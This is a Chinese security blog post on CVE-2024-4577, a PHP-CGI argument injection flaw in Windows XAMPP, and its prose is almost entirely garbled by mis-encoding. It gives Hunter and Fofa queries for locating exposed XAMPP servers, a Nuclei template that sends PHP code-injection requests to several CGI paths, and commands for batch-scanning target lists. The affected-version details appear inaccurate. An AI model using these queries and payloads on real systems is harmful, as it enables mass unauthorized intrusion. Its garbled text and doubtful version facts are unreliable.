#  CVE-2024-4577 - PHP CGI ÂèÇÊï∞Ê≥®ÂÖ•ÊºèÊ¥ûÊâπÈáèÔºàÂ§çÁé∞ÔºâNuclei Ê®°Êùø   
 OtsÂÆâÂÖ®   2024-06-08 14:22  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
CVE-2024-4577 - Âèà‰∏Ä‰∏™ PHP RCEÔºöËÆ© PHP-CGI ÂèÇÊï∞Ê≥®ÂÖ•ÂÜçÊ¨°‰ºüÂ§ßÔºÅ  
  
ËøôÊòØÊàëÂú®ÂáÜÂ§áBlack Hat USAÊºîËÆ≤Êó∂ÂèëÁé∞ÁöÑ‰∏Ä‰∏™ÈôÑÂ∏¶ÊïÖ‰∫ã/È¢ùÂ§ñÊºèÊ¥û„ÄÇÊàëÁõ∏‰ø°Â§ßÈÉ®ÂàÜÁªÜËäÇÂ∑≤ÁªèÂú®ÂÆòÊñπÂÖ¨Âëä‰∏≠Ê∂µÁõñ ÔºàÂ∫îËØ•ÂæàÂø´Â∞±‰ºöÂèëÂ∏ÉÔºâ„ÄÇÂ∞ΩÁÆ°ÈöèÁùÄÊó∂Èó¥ÁöÑÊé®ÁßªÔºåPHP-CGI Â∑≤ÈÄêÊ∏êË¢´Ê∑òÊ±∞Ôºå‰ΩÜÊ≠§ÊºèÊ¥ûÈªòËÆ§‰ºöÂΩ±ÂìçWindows Áâà XAMPPÔºåÂÖÅËÆ∏Êú™ÁªèË∫´‰ªΩÈ™åËØÅÁöÑÊîªÂáªËÄÖÈÄöËøáÁâπÂÆöÂ≠óÁ¨¶Â∫èÂàóÂú®ËøúÁ®ã XAMPP ÊúçÂä°Âô®‰∏äÊâßË°å‰ªªÊÑè‰ª£Á†Å„ÄÇ  
  
  
Èâ¥‰∫é PHP Âíå XAMPP Âú®ÁΩëÁªúÁîüÊÄÅÁ≥ªÁªü‰∏≠ÁöÑÂπøÊ≥õ‰ΩøÁî®ÔºåÊàëÊï¶‰øÉÂ§ßÂÆ∂Ê£ÄÊü•Ëá™Â∑±ÊòØÂê¶ÂèóÂà∞ÂΩ±ÂìçÂπ∂Áõ∏Â∫îÂú∞Êõ¥Êñ∞Á≥ªÁªü„ÄÇËØ∑ÂèÇÈòÖDEVCORE ÂèëÂ∏ÉÁöÑÂÆâÂÖ®Ë≠¶Êä• ‰ª•‰∫ÜËß£ÁºìËß£Êé™ÊñΩ„ÄÇ  
  
  
Ëøô‰∏™ÊºèÊ¥ûÈùûÂ∏∏ÁÆÄÂçïÔºå‰ΩÜËøô‰πüÊòØÂÆÉÊúâË∂£ÁöÑÂú∞Êñπ„ÄÇË∞Å‰ºöÊÉ≥Âà∞Ôºå‰∏Ä‰∏™ÁªèËøá 12 Âπ¥ÂÆ°Êü•Âπ∂Ë¢´ËØÅÊòéÂÆâÂÖ®ÁöÑË°•‰∏ÅÔºå‰ºöÂõ†‰∏∫Windows ÁöÑ‰∏Ä‰∏™Â∞èÂäüËÉΩËÄåË¢´ÁªïËøáÔºüÊàëÁõ∏‰ø°Ëøô‰∏™ÂäüËÉΩÂèØËÉΩ‰ºöÂØºËá¥Êõ¥Â§öÁöÑÊΩúÂú®ÊºèÊ¥û„ÄÇÂ¶ÇÊûú‰Ω†‰ΩøÁî®ËøôÁßçÊäÄÊúØÔºåÂà´Âøò‰∫ÜÂèÇËÄÉËøôÁØáÊñáÁ´†ÔºÅhttps://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ucoderef/d1980631-6401-428e-a49d-d71394be7da8üòâ  
  
Ê≠§ÊºèÊ¥ûÁî± DEVCORE (@d3vc0r3) ÁöÑ Orange Tsai (@orange_8361) ÂèëÁé∞„ÄÇËØ∑Âä°ÂøÖÂÖ≥Ê≥®‰ªñÁöÑÂá∫Ëâ≤Á†îÁ©∂ÔºåÊàë‰ª¨ÁöÑËßíËâ≤Âè™ÊòØÈáçÁé∞ÂíåÂºÄÂèëÊ≠§ÈóÆÈ¢òÁöÑÊºèÊ¥û„ÄÇÂÆâÂÖ®Ë≠¶Êä•ÔºöCVE-2024-4577 PHP CGI ÂèÇÊï∞Ê≥®ÂÖ•ÊºèÊ¥û  
  
Ê¶ÇËø∞ CVE-2024-4577 ÊòØ PHP ‰∏≠ÁöÑ‰∏Ä‰∏™‰∏•ÈáçÊºèÊ¥ûÔºåÂΩ±Âìç CGI ÈÖçÁΩÆÔºåÂÖÅËÆ∏ÊîªÂáªËÄÖÈÄöËøáÁ≤æÂøÉËÆæËÆ°ÁöÑ URL ÂèÇÊï∞ÊâßË°å‰ªªÊÑèÂëΩ‰ª§„ÄÇ  
  
ÂèóÂΩ±ÂìçÁöÑÁâàÊú¨  
- Windows ‰∏ä‰ΩøÁî® ÁöÑ PHP 7.4.29 Âíå 8.0.19 ‰πãÂâçÁöÑÁâàÊú¨php-cgi„ÄÇ  
  
Èπ∞ÂõæÔºö  
```
web.body="XAMPP"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tacKBcBqvqicVob2kJj6MgGxJnA6MSp5EYRa5ZYj3s6xLZszUCMcpianm5USRqssjXbpAq9hPj6yWcGA/640?wx_fmt=png&from=appmsg "")  
  
FofaÔºö  
```
product="XAMPP"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tacKBcBqvqicVob2kJj6MgGxJKSdm0GbaiaxQeiard2a9Snqic0qc11VzKBAWuGL4K7BLyZcxVVfGGOEFw/640?wx_fmt=png&from=appmsg "")  
```
id: CVE-2024-4577

info:
  name: CVE-2024-4577 PHP CGI Argument Injection
  author: H√ºseyin TINTA≈û
  severity: critical
  description: >
    CVE-2024-4577 PHP CGI Argument Injection Vulnerability.
    This template checks if the response contains "CVE2024_EXP_TEST_1337" indicating a successful injection.

requests:
  - method: GET
    path:
      - "{{BaseURL}}/cgi-bin/php-cgi.exe?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20echo%20\"CVE2024_EXP_TEST_1337\";?>"
      - "{{BaseURL}}/cgi-bin/php.exe?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20echo%20\"CVE2024_EXP_TEST_1337\";?>"
      - "{{BaseURL}}/php-cgi/php-cgi.exe?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20echo%20\"CVE2024_EXP_TEST_1337\";?>"
      - "{{BaseURL}}/php-cgi/php.exe?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20echo%20\"CVE2024_EXP_TEST_1337\";?>"
      - "{{BaseURL}}/index.php?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20echo%20\"CVE2024_EXP_TEST_1337\";?>"
    matchers:
      - type: word
        words:
          - "CVE2024_EXP_TEST_1337"
```  
  
```
nuclei -t CVE-2024-4577.yaml -u
nuclei -l XXXX.TXT -t CVE-2024-4577.yaml
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tacKBcBqvqicVob2kJj6MgGxJkttoDib0KczBZt2o5PRic4HvkTjkNFxasfGDj7zKRY2xQn3eGX2kS7Kw/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tacKBcBqvqicVob2kJj6MgGxJZq3HTurzwQgYbA3WJiaPmrvefO7dq71ibHkVricoVIBsIn1qicdAQiaV3eA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tacKBcBqvqicVob2kJj6MgGxJWrVica4By4pu8vO3D8Nj0nMb1I9jFWe524cUEA3fictSkdBdAJ89Xvzg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tacKBcBqvqicVob2kJj6MgGxJDibxZAHaXoKfzxHyibtR30MAO0Oyc5ldjNcNcq0oLOawjdjkfOibXGdJA/640?wx_fmt=png&from=appmsg "")  
  
```
https://github.com/huseyinstif/CVE-2024-4577-Nuclei-Template/tree/main
```  
  
  
  
  
ÊÑüË∞¢ÊÇ®ÊäΩÂá∫  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
Êù•ÈòÖËØªÊú¨Êñá  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**ÁÇπÂÆÉÔºåÂàÜ‰∫´ÁÇπËµûÂú®ÁúãÈÉΩÂú®ËøôÈáå**  
  
